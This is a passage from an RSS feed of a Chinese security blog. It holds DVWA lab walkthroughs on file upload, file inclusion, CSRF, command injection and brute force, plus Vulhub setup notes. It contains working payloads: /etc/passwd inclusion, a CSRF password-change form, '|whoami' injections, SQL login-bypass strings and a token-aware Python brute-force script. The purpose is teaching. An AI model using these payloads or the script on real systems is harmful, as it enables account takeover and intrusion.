+			<link>https://www.a1ee.cn/basic/dvwa_file_upload/</link>
+			<pubDate>Mon, 28 Dec 2020 13:37:52 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/dvwa_file_upload/</guid>
+			<description>DVWA_File Upload（文件上传） LOW 上传的，当然是webshell，但是为了演示，我就传个输出phpinfo的代码吧 &amp;lt;?php phpinfo(); ?&amp;gt; 访问路径，返回信息。 鉴于完</description>
+			<content type="html"><![CDATA[<h1 id="dvwa_file-upload文件上传">DVWA_File Upload（文件上传）</h1>
+<h2 id="low">LOW</h2>
+<p>上传的，当然是webshell，但是为了演示，我就传个输出phpinfo的代码吧</p>
+<pre><code>&lt;?php
+	phpinfo();
+?&gt;
+</code></pre><p><img src="/_v_images/20200909094852831_5128.png" alt=""></p>
+<p>访问路径，返回信息。</p>
+<p><img src="/_v_images/20200909094831378_11532.png" alt=""></p>
+<p>鉴于完全裸奔的逻辑，就不看源码了。</p>
+<h2 id="medium">MEDIUM</h2>
+<p>直接上传，返回报错提示：</p>
+<p><img src="/_v_images/20200909095058850_14650.png" alt=""></p>
+<p>那就是说存在文件类型校验，修改报文信息中的<code>Content-Type: </code>属性，将<code>application/octet-stream</code>改为<code>image/png</code>发现可以上传：</p>
+<p><img src="/_v_images/20200909095536129_17954.png" alt=""></p>
+<p>改成png是因为上面提示了文件类型，如果没有提示，那就可以尝试其他的文件类型后缀。</p>
+<p>查看源码，整个核心代码如下：</p>
+<p><img src="/_v_images/20200909101352768_18720.png" alt=""></p>
+<p>业务逻辑就是检查文件类型是否满足三种图片格式，如果满足则进行长传，如果不满足，则抛出错误。</p>
+<h2 id="high">HIGH</h2>
+<p>鉴于上面已经对文件类型做了校验，那么这里肯定是对文件头做了校验的场景了，因为一般情况下，对图片做校验也就是这两种方式，当然还有限定文件后缀的形式来确保上传的文件是不可执行的文件。那就开始动手吧：</p>
+<p>可以使用cmd的copy命令，将图片和webshell拼接成一个文件，当然了，其实可以直接使用编辑器打开图片，将代码插入到图片码的最下方，保存文件，也能起到同样的效果，</p>
+<p>我就很偷懒的，只是将图片头保留了下来，生成了如下的一个图片：</p>
+<p><img src="/_v_images/20200909103452618_9588.png" alt=""></p>
+<p><strong>注：这里使用notepad++实属无奈，虽然它好用，但我选sublime，希望内陆也能有一款优秀的编辑器诞生。另外：不要对不了解的东西妄加评论（自言自语）</strong></p>
+<p>这里多次尝试，发现必须是图片后缀名，且必须存在图片文件头的文件才能正常上传，那只能利用本地文件包含来试试触发漏洞执行了，这里就不操作了。</p>
+<p><img src="/_v_images/20200909104225641_31038.png" alt=""></p>
+<h2 id="impossible">IMPOSSIBLE</h2>
+<p>该级关键代码如下：</p>
+<p><img src="/_v_images/20200909104427098_14722.png" alt=""></p>
+<p>重命名文件，重构图片，模糊化返回，这应该是目前最全的文件上传防护了。</p>
+<p>其实针对文件上传还有很多种方式，比如编码后上传，然后采用特定解码打开webshell文件，大小写webshell函数，添加文件头，后缀名解析绕过，都是文件上传时会用到的特殊技巧，当文件包含存在的时候降低了对上传的要求，更容易利用成功。</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Dvwa_file_inclusion</title>
+			<link>https://www.a1ee.cn/basic/dvwa_file_inclusion/</link>
+			<pubDate>Mon, 28 Dec 2020 13:35:26 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/dvwa_file_inclusion/</guid>
+			<description>DVWA_File Inclusion（文件包含） 可分为本地文件包含和远程文件包含： 本地文件包含可以将本地的文件包含到当前页面，适用于上传的webshell无</description>
+			<content type="html"><![CDATA[<h1 id="dvwa_file-inclusion文件包含">DVWA_File Inclusion（文件包含）</h1>
+<p>可分为本地文件包含和远程文件包含：</p>
+<ul>
+<li>
+<p>本地文件包含可以将本地的文件包含到当前页面，适用于上传的webshell无能直接被解析出来，例如存在后缀名的严格限制，只能上传图片格式，且不存在解析漏洞，这种情况下使用本地文件包含，包含上传的webshell，也可以获取到权限，还有就是可以直接包含本地服务器上的关键配置文件，例如/etc/passwd和关键配置文件，这样也可以获取到关键的信息。</p>
+</li>
+<li>
+<p>远程文件包含就是说直接将文件的位置，替换为链接，这样就可以包含进来外部的文件，可利用的区域是本地上传webshell失败，可使用外部文件包含，包含在服务器上的webshell，这样也可以获取到目标服务器的权限。</p>
+</li>
+</ul>
+<h2 id="low">LOW</h2>
+<p>本地文件包含：该级的访问方式很直白<code>http://192.168.116.131/DVWA/vulnerabilities/fi/?page=file1.php</code>，将<code>file1.php</code>替换为<code>/etc/passwd</code>即可获取到本地文件。</p>
+<p><img src="/_v_images/20200908161001571_8494.png" alt=""></p>
+<p>远程文件包含：将<code>file1.php</code>替换为<code>http://www.baidu.com</code>，包含成功。</p>
+<p><img src="/_v_images/20200908162102826_22943.png" alt=""></p>
+<h2 id="medium">MEDIUM</h2>
+<p>应该是存在过滤的，不过直接采用上一级的访问方式，本地文件包含仍可成功：</p>
+<p><img src="/_v_images/20200908162436337_11292.png" alt=""></p>
+<p>远程文件包含失败：</p>
+<p><img src="/_v_images/20200908162513833_9642.png" alt=""></p>
+<p>猜测是对域名进行了过滤，可以采用改变大小写、包含复写等方式进行尝试（这里使用了改变大小写:hTtpS）：</p>
+<p><img src="/_v_images/20200908162744721_30880.png" alt=""></p>
+<p>猜测应该是基于黑名单的过滤防护，能用白名单，就不要用黑名单，这是基本的安全意识。</p>
+<p>源代码如下：</p>
+<p><img src="/_v_images/20200908163004763_18636.png" alt=""></p>
+<h2 id="high">HIGH</h2>
+<p>该级应该是存在伪白名单的，可定位是high，不能是完全防御，但我还是无耻的看了源码：</p>
+<p><img src="/_v_images/20200908163434527_9554.png" alt=""></p>
+<p>这样的话，远程文件包含就没戏了，只能本地文件包含了：</p>
+<p><img src="/_v_images/20200908163524917_28685.png" alt=""></p>
+<p>想着这个伪白名单，我怀疑作者是个心机boy，<code>file1.php</code>，<code>file2.php</code>，<code>file3.php</code>，<code>file4.php</code>的文件名是最后的善意。</p>
+<h2 id="impossible">IMPOSSIBLE</h2>
+<p>最后的等级，当然是白名单限制死了，所以没啥说的。</p>
+<p><img src="/_v_images/20200908163721214_22688.png" alt=""></p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Dvwa_csrf</title>
+			<link>https://www.a1ee.cn/basic/dvwa_csrf/</link>
+			<pubDate>Mon, 28 Dec 2020 13:25:07 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/dvwa_csrf/</guid>
+			<description>DVWA_CSRF（跨站请求伪造） 有一次有个人问我，csrf的最佳防护方式是什么，但是很遗憾，我虽然知道csrf的危害，但从未遇到过真实可用</description>
+			<content type="html"><![CDATA[<h1 id="dvwa_csrf跨站请求伪造">DVWA_CSRF（跨站请求伪造）</h1>
+<p>有一次有个人问我，csrf的最佳防护方式是什么，但是很遗憾，我虽然知道csrf的危害，但从未遇到过真实可用的案例，或者是被我忽略了，所以当时就回答了一句：最简单的方法是Referer校验，但仍有风险，后来我仔细想了一下，在普通的功能页，可以采用token的形式来防止csrf的利用，对关键操作进行人机交互，可以是在危险的操作前加上网页或短信验证码输入，当然必须有完善的校验过程，或者是必要的用户自确认，例如密码输入。总而言之，就是一定要用户输入一个，不能用脚本模拟获取并操作的东西。</p>
+<h2 id="low">LOW</h2>
+<p>为了演示漏洞，这是一个密码修改的功能，low级可以直观的感受到整个业务流，发送请求，在请求中填写新密码，后端接受到请求报文进行操作，</p>
+<p><img src="/_v_images/20200908143310557_20556.png" alt=""></p>
+<p>使用burpsuite生成的poc如下：</p>
+<pre><code>&lt;html&gt;
+  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+  &lt;body&gt;
+  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
+    &lt;form action=&quot;http://192.168.116.131/DVWA/vulnerabilities/csrf/&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;new&quot; value=&quot;password&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;conf&quot; value=&quot;password&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot; /&gt;
+      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>放在服务器上，让用户在登录的状态下访问此页即可修改该用户密码。这应该是很老很老的设计模型了，现在应该很难得看到这种设计了。</p>
+<h2 id="medium">MEDIUM</h2>
+<p>在该等级中，存在了referer校验，所以直接使用上一级的poc是不会奏效的。</p>
+<p><img src="/_v_images/20200908150732130_32553.png" alt=""></p>
+<p>查看源代码可以解锁新知识：</p>
+<p><img src="/_v_images/20200908152331113_17682.png" alt=""></p>
+<p><code>stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false</code>该条命令的意思是对referer与host匹配，那么把文件名更改成host不就行了……</p>
+<h2 id="high">HIGH</h2>
+<p>观察该级发送的数据报文，发现多了一个user_token参数，</p>
+<p><img src="/_v_images/20200908153107206_22343.png" alt=""></p>
+<p>查看源代码：</p>
+<p><img src="/_v_images/20200908154430118_8842.png" alt=""></p>
+<p>这里需要解决的是token问题，这个token是必须要后台生成，攻击服务器上的页面是没有办法获取到有效token的，这就导致了不能采用传统的csrf方式，但是可以将攻击代码写成js文件，保存到服务器上，通过xss攻击引入外部js，来重置密码。</p>
+<p>如果网站上没有xss攻击点的话，只有token还是满足了安全需求的，但是总有一些犄角旮旯会有这种东西。js代码功底有限，这里就不copy大佬的代码了。</p>
+<h2 id="impossible">IMPOSSIBLE</h2>
+<p>该级的代码逻辑就是人机交互，身份确认，我认为是最没有可能进行csrf攻击的防护方式。</p>
+<p><img src="/_v_images/20200908155325270_29198.png" alt=""></p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Dvwa_command_injection</title>
+			<link>https://www.a1ee.cn/basic/dvwa_command_injection/</link>
+			<pubDate>Mon, 28 Dec 2020 13:19:13 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/dvwa_command_injection/</guid>
+			<description>DVWA_Command Injection（命令注入） LOW 按要求输入ip地址，返回结果如下： 那么功能就是调用了一个ping的功能，如果是直接将输入内容取出来拼接在命</description>
+			<content type="html"><![CDATA[<h1 id="dvwa_command-injection命令注入">DVWA_Command Injection（命令注入）</h1>
+<h2 id="low">LOW</h2>
+<p>按要求输入ip地址，返回结果如下：</p>
+<p><img src="/_v_images/20200905205615601_7106.png" alt=""></p>
+<p>那么功能就是调用了一个<code>ping</code>的功能，如果是直接将输入内容取出来拼接在命令后面，那么在<code>ip</code>地址后面，加上<code>&amp;&amp;</code>是不是会将后面的命令一起执行了呢？键入：<code>127.0.0.1&amp;&amp;whoami</code>结果如下：</p>
+<p><img src="/_v_images/20200905205823787_28815.png" alt=""></p>
+<p>看来是真的就是这样设计的，看看源代码验证一下呢。</p>
+<p><img src="/_v_images/20200905210026789_27576.png" alt=""></p>
+<h2 id="medium">MEDIUM</h2>
+<p>这个时候再尝试，发现刚才使用测试命令不返回了，应该是加了一些过滤，尝试使用管道连接符<code>|</code>发现并未进行过滤，看来过滤并不严格，任然可以通过其他的方式进行命令注入，键入：<code>127.0.0.1|whoami</code>结果如下：</p>
+<p><img src="/_v_images/20200905210626256_20540.png" alt=""></p>
+<p>查看源代码，发现确实存在过滤，不过很有限，仅仅是过滤了<code>&amp;&amp;</code>，<code>;</code>：</p>
+<p><img src="/_v_images/20200905210738401_6313.png" alt=""></p>
+<p>如果就是这种程度的过滤，那还有太多可用的注入方式可用了……</p>
+<h2 id="high">HIGH</h2>
+<p>继续使用上面的注入方式进行测试，发现成功返回了！看来这个等级的防护，也没有对这个符号进行过滤，看一下源代码：</p>
+<p><img src="/_v_images/20200905211113324_13736.png" alt=""></p>
+<p>原来存在过滤，不过这种定格式的过滤，也太鸡肋了，而且很笨……</p>
+<h2 id="impossible">IMPOSSIBLE</h2>
+<p>直接看代码吧，看看健全的防护应该有哪些：</p>
+<p><img src="/_v_images/20200905211439578_13125.png" alt=""></p>
+<p>stripslashes函数去掉反斜杠</p>
+<p>explode函数取出ip地址的四个组成数字</p>
+<p>is_numeric函数判断是否是数字</p>
+<p>然后拼接起来接入命令中执行，最后的出结果，不过我很不巧的看到了一个is_numeric函数绕过的方式，十六进制绕过，但是当我将<code>127.0.0.0x317c77686f616d69</code>（0x317c77686f616d69是字符串<code>1|whoami</code>的十六进制形式）键入到ip地址输入框时，没有任何返回，然后我将命令在cmd窗口中运行时，发现并没有对十六进制进行解析……看来是我太天真了。</p>
+<p>这种防护方式采用了定格式输入的方式，而不是定格式排除（也就是黑白名单的区别），不得不说，白名单才是正确的防护之道，因为黑名单存在多种变种，是禁不完的！</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Dvwa_brute_force</title>
+			<link>https://www.a1ee.cn/basic/dvwa_brute_force/</link>
+			<pubDate>Mon, 28 Dec 2020 13:16:25 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/dvwa_brute_force/</guid>
+			<description>DVWA_Brute Force（暴力破解） 这是一个有登录功能，也就是数据库校验功能的页面，从页面上不难看出，可能的漏洞点是暴力破解 LOW 截取low级别的请求报文，</description>
+			<content type="html"><![CDATA[<h1 id="dvwa_brute-force暴力破解">DVWA_Brute Force（暴力破解）</h1>
+<p>这是一个有登录功能，也就是数据库校验功能的页面，从页面上不难看出，可能的漏洞点是暴力破解</p>
+<p><img src="/_v_images/20200824222619478_32736.png" alt=""></p>
+<h2 id="low">LOW</h2>
+<p>截取low级别的请求报文，get方式的明文传输，重复发送，也并未限制登录功能，这个时候就可以尝试暴力破解用户名密码了。</p>
+<p><img src="/_v_images/20200824223004572_13644.png" alt=""></p>
+<p>将报文发送到<code>inrtuder</code>模块进行暴力破解</p>
+<p><img src="/_v_images/20200826204957528_28834.png" alt=""></p>
+<p>先使用<code>clear</code>清除已标记的变量，然后使用<code>add</code>新增需要暴力破解的变量，然后选择<code>cluster bomb</code>，进入到<code>payloads</code>标签进行<code>payload</code>加载。</p>
+<p><code>payload set</code>选择变量顺序（1代表的是报文中自上而下的第一个变量），然后在<code>payuload options</code>中添加<code>payload</code>列表，第二个变量同理设定即可。</p>
+<p><img src="/_v_images/20200826205257066_14441.png" alt=""></p>
+<p>在免费版中线程数不可设定，收费版可进行设置，设置位置在<code>options</code>标签中。设置完成就点击右上角的<code>start attack</code>。</p>
+<p><img src="/_v_images/20200826210203261_13103.png" alt=""></p>
+<p>当相应包长度<code>Length</code>的值发生变化时，就说明可能爆破已经成功了。</p>
+<p><em>附录：burpsuite intruder 模块说明</em>
+<em>sniper（单点枚举）：整个请求报文中，只能选择一个变量，也只能有一个payload列表，单点的进行枚举替换。</em>
+<em>battering ram（同步枚举）：整个请求报文中，可以有多个变量，但只有一个payload列表，同步对每个变量进行枚举替换。</em>
+<em>pitchfork（同行枚举）：整个请求报文中可以有n个变量，同时有n个payload，且payload行数必须相同才能达到预期的枚举效果，不然将只会枚举最短的payload行数。实际枚举替换过程：每个payload列表同行替换，例如payload1替换第十行语句，payloadn也替换第十行语句。</em>
+<em>cluster bomb（交叉枚举）：整个请求报文中可以有n个变量，同时有n个payload，每个payload相互独立。实际枚举替换过程：其余payload不变，payload1逐条替换，然后payload2变成第二行语句，接着payload1逐条替换，payload2再向下一行，接着payload1逐条替换，以此往复，直至payloadn全部被替换。</em></p>
+<p>工具使用完成后，再来看看源代码上是怎么实现的：</p>
+<p><img src="/_v_images/20200824223358938_7412.png" alt=""></p>
+<p>这个代码原理很简陋，并未做任何过滤。</p>
+<pre><code>$query  = &quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';&quot;;
+</code></pre><p>这条很直白的说明了，万用密码的可能：</p>
+<pre><code>admin' #
+admin' -- -
+admin' and 1=1#
+</code></pre><h2 id="medium">MEDIUM</h2>
+<p>抓包重发，发现响应存在延迟，并未锁死账户，仍可暴力破解，这里就不演示了，万用密码已经不可用，说明是存在了过滤的，查看源代码：</p>
+<p><img src="/_v_images/20200826213611209_1407.png" alt=""></p>
+<p>整个过程多了一次<code>mysqli_real_escape_string</code>过滤，该函数的定义和用法如下：</p>
+<p><img src="/_v_images/20200826213950727_23507.png" alt=""></p>
+<p>过滤掉了<code>username</code>参数中<code>sql注入</code>所需要的字符串，然后当校验错误时<code>sleep( 2 )</code>，这就是造成重放阶段响应包延迟返回的原因，增加了暴力破解所需的时间，但并未杜绝此项攻击的可能。</p>
+<h2 id="high">HIGH</h2>
+<p>通过抓取数据包，发现新增了一个<code>user_token</code>参数，重放发现并不能直接获取到返回数据。</p>
+<p><img src="/_v_images/20200826214417052_29048.png" alt=""></p>
+<p>观察截取到的数据报文，两次请求之间并未进行其他的获取<code>token</code>请求，因此这里查看页面源代码，在页面中找到了随机服务器随机生成的<code>token</code>值。</p>
+<p><img src="/_v_images/20200826215202955_9563.png" alt=""></p>
+<p>多发送几次数据报文，得知：当前发送的<code>token</code>值存在于当前页面，响应页面中存在的<code>token</code>值是下次发送的token值。</p>
+<p>这个时候就可以写脚本来进行爆破了：</p>
+<pre><code>import requests,re,click
+
+@click.command()
+@click.option('-u', '--username', prompt='Your username file path: ', help='需要加载的用户名字典路径.')
+@click.option('-p', '--password', prompt='Your password file path: ', help='需要加载的密码字典路径.')
+@click.option('-P', '--phpsession', prompt='Current phpsession id: ', help='当前web前端使用的phpsession参数.')
+@click.option('-U', '--url', prompt='url: ', help='实验环境中需要爆破的url地址.')
+
+def main(username, password, phpsession, url):
+    &quot;&quot;&quot;DVWA Brute Force high python3 script.\n
+    You need to set the following parameters.&quot;&quot;&quot;
+    headers = {&quot;Cookie&quot;:&quot;security=high; PHPSESSID=&quot; + phpsession}
+    response_page = requests.get(url,headers=headers)
+    user_token = re.findall(&quot;(?&lt;=&lt;input type='hidden' name='user_token' value=').+?(?=' /&gt;)&quot;,response_page.text)[0]
+    flag = False
+    total = 0
+    name_list = open(username, 'r')
+    for name in name_list:
+    	uname = name.strip()
+    	pwd_list = open(password, 'r')
+    	for pwd in pwd_list:
+    		passwd = pwd.strip()
+    		params = {'username': uname, 'password': passwd, 'Login': 'login','user_token':user_token}
+    		response_page = requests.get(url, params=params, headers=headers)
+    		if &quot;Username and/or password incorrect.&quot; in response_page.text:
+    			flag = False
+    			total+=1
+    		else:
+    			flag = True
+    			total+=1
+    		user_token = re.findall(&quot;(?&lt;=&lt;input type='hidden' name='user_token' value=').+?(?=' /&gt;)&quot;,response_page.text)[0]
+    		if flag == True:
+    			click.secho('username:%s\t,password:%s\tThis is a valid combination!' %(uname, passwd), fg='green')
+    	pwd_list.close()
+    name_list.close()
+    click.secho('All dictionaries have been run, total: %d' %total)
+
+if __name__ == '__main__':
+    main()
+</code></pre><p>脚本为了增加通用性，引入了命令行参数的方式，输入用户名字典，密码字典，cookie中的phpsession，以及需要爆破的url，即可完成开始爆破，并未采用错误回显，将会一直运行，当遇到正确的用户名密码时，将输出到命令行，运行结束时，会输出结束提示及总共跑了多少组用户名密码组合。</p>
+<h2 id="impossible">IMPOSSIBLE</h2>
+<p>为什么说这是不可能进行爆破的呢，首先从第一次尝试开始：</p>
+<p><img src="/_v_images/20200905194634960_340.png" alt=""></p>
+<p>输入错误1次，账号锁定15分钟，也就是说存在账号锁定机制，一般情况下，真实的业务上不可能错误一次就会锁定账号，但是三五次后锁定账号的还是很普遍的。这种就不可能用爆破的方式来进行密码枚举了，但是如果你的密码足够弱，例如88888888，那么，在有限次数内被猜解出来还是有可能的。</p>
+<p>接下来看看代码实现：</p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; isset ($_POST['password']) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input
+    $user = $_POST[ 'username' ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Sanitise password input
+    $pass = $_POST[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = md5( $pass );
+
+    // Default values
+    $total_failed_login = 3;
+    $lockout_time       = 15;
+    $account_locked     = false;
+
+    // Check the database (Check user information)
+    $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // Check to see if the user has been locked out.
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) )  {
+        // User locked out.  Note, using this method would allow for user enumeration!
+        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;
+
+        // Calculate when the user would be allowed to login again
+        $last_login = strtotime( $row[ 'last_login' ] );
+        $timeout    = $last_login + ($lockout_time * 60);
+        $timenow    = time();
+
+        /*
+        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;
+        */
+
+        // Check to see if enough time has passed, if it hasn't locked the account
+        if( $timenow &lt; $timeout ) {
+            $account_locked = true;
+            // print &quot;The account is locked&lt;br /&gt;&quot;;
+        }
+    }
+
+    // Check the database (if username matches the password)
+    $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR);
+    $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // If its a valid login...
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {
+        // Get users details
+        $avatar       = $row[ 'avatar' ];
+        $failed_login = $row[ 'failed_login' ];
+        $last_login   = $row[ 'last_login' ];
+
+        // Login successful
+        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;
+        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;
+
+        // Had the account been locked out since last login?
+        if( $failed_login &gt;= $total_failed_login ) {
+            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;
+            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;
+        }
+
+        // Reset bad login count
+        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;' );
+        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    } else {
+        // Login failed
+        sleep( rand( 2, 4 ) );
+
+        // Give the user some feedback
+        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;
+
+        // Update bad login count
+        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
+        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    }
+
+    // Set the last login time
+    $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre><p>功能上增加了锁定账号机制，以及pdo（sql注入防护技术）。这才是合规开发应该进行的正常操作！</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Build_vulhub</title>
+			<link>https://www.a1ee.cn/basic/build_vulhub/</link>
+			<pubDate>Wed, 09 Sep 2020 13:48:07 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/build_vulhub/</guid>
+			<description>Ubuntu Server 安装 Vulhub 根据官方网站的说明，需要安装docker和docker-compose，需要用pip安装docker-compose，官方的演示视</description>
+			<content type="html"><![CDATA[<h1 id="ubuntu-server-安装-vulhub">Ubuntu Server 安装 Vulhub</h1>
+<p>根据<a href="https://vulhub.org/">官方网站</a>的说明，需要安装<code>docker</code>和<code>docker-compose</code>，需要用<code>pip</code>安装<code>docker-compose</code>，官方的演示视频中使用的命令如下：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># If you don&#39;t have a docker installed, you&#39;ll need to install docker</span>
+curl -s https://get.docker.com/ <span class="p">|</span> sh
+
+<span class="c1"># If you don&#39;t have a pip installed, you&#39;ll need to install pip</span>
+curl -s https://bootstrap.pypa.io/get-pip.py <span class="p">|</span> python3
+
+<span class="c1"># Use pip to install docker-compose</span>
+pip install docker-compose
+
+<span class="c1"># git clone vulhub source</span>
+git clone https://github.com/vulhub/vulhub
+
+<span class="c1"># Entry vulnerability directory</span>
+<span class="nb">cd</span> /path/to/vuln/
+
+<span class="c1"># Compile (optional)</span>
+docker-compose build
+
+<span class="c1"># Run</span>
+docker-compose up -d
+</code></pre></div><p><strong>注：由于网络环境的问题，部分命令采用了等级处理，详见下文。</strong></p>
+<p>本地搭建的<code>Ubuntu Server</code>实机演示截图如下：
+安装<code>docker</code>，命令：<code>curl -s https://get.docker.com/ | sh</code></p>
+<p><img src="/_v_images/20200826174153268_13222.png" alt=""></p>
+<p>安装<code>pip</code>，命令：<code>curl -s https://bootstrap.pypa.io/get-pip.py | python3</code>，在本地网络环境下的<code>Ubuntu 18.04.5</code>中，很遗憾的无法正常执行该命令，取消-s参数后，将看到并未进行下载安装（猜测是网络原因导致的问题）：</p>
+<p><img src="/_v_images/20200827090852112_9538.png" alt=""></p>
+<p>于是只能采用apt命令安装，具体命令如下：</p>
+<pre><code>apt-get install python3-pip
+</code></pre><p>安装完成以后的pip版本如下：</p>
+<p><img src="/_v_images/20200827100049007_28795.png" alt=""></p>
+<p>安装<code>docker-compose</code>，命令：<code>pip3 install docker-compose</code>，你可能会因为网络原因而失败很多次，我没有很好的建议，因为我的做法是不断的重复执行该条命令，由于pip安装的时候会将下载的包缓存到本地，所以我就利用这个特性，慢慢的把整个安装所需的包下载到了本地最后成功安装了，当前安装的版本如下：</p>
+<p><img src="/_v_images/20200827104943518_10737.png" alt=""></p>
+<p>安装好<code>docker</code>后就需要<code>git</code>下载<code>vulhub</code>源码了:<code>git clone https://github.com/vulhub/vulhub</code>
+现在实验环境搭建完成。</p>
+<h2 id="配置下载源">配置下载源</h2>
+<p>下载了vulhub的框架后，先不要进行实验，添加国内镜像地址，可以使下载镜像的时候，快上许多。
+创建daemon.json文件<code>vim /etc/docker/daemon.json</code>，再往里写入镜像地址，我这里用的中科大的地址：</p>
+<pre><code>{
+	&quot;registry-mirrors&quot;: [&quot;http://docker.mirrors.ustc.edu.cn&quot;]
+}
+</code></pre><p><img src="/_v_images/20201202101721106_19536.png" alt=""></p>
+<p>更新好了以后，需要重启一下docker：<code>systemctl restart docker</code></p>
+<h2 id="docker命令">docker命令</h2>
+<p>整个vulhub实验中需要用到的docker命令很少，基础命令即可：</p>
+<pre><code>docker-compose up -d        构建并启动容器（需要进入到容器目录）（-d表示后台运行）
+docker ps                   列出当前多有的容器及相关信息
+docker start/stop 容器名/id 启动/停止 指定容器
+docker restart 容器名/id    重启 指定容器
+docker exec -it 容器名/id bash  进入到指定容器当中（命令行中输入exit退出容器）
+docker ps -a                查看所有容器
+docker-compose down         停止并删除当前运行的容器
+docker rm 容器名/id          删除指定容器
+docker images               查看所有镜像
+docker rmi 镜像名/id         删除指定镜像
+</code></pre>]]></content>
+		</item>
+		
+		<item>
+			<title>Build_lab</title>
+			<link>https://www.a1ee.cn/basic/build_lab/</link>
+			<pubDate>Wed, 09 Sep 2020 11:37:04 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/build_lab/</guid>
+			<description>Ubuntu Server 安装 DVWA 和 SQLI-Lab 环境下载 本地虚拟机安装ubuntu server 20.04.1 LTS 然后使用xshell连接服务器，采用xftp上传一键下载环境的脚本，脚本内命令如下： #!/bin/sh</description>
+			<content type="html"><![CDATA[<h1 id="ubuntu-server-安装-dvwa-和-sqli-lab">Ubuntu Server 安装 DVWA 和 SQLI-Lab</h1>
+<h2 id="环境下载">环境下载</h2>
+<p>本地虚拟机安装<code>ubuntu server 20.04.1 LTS</code>
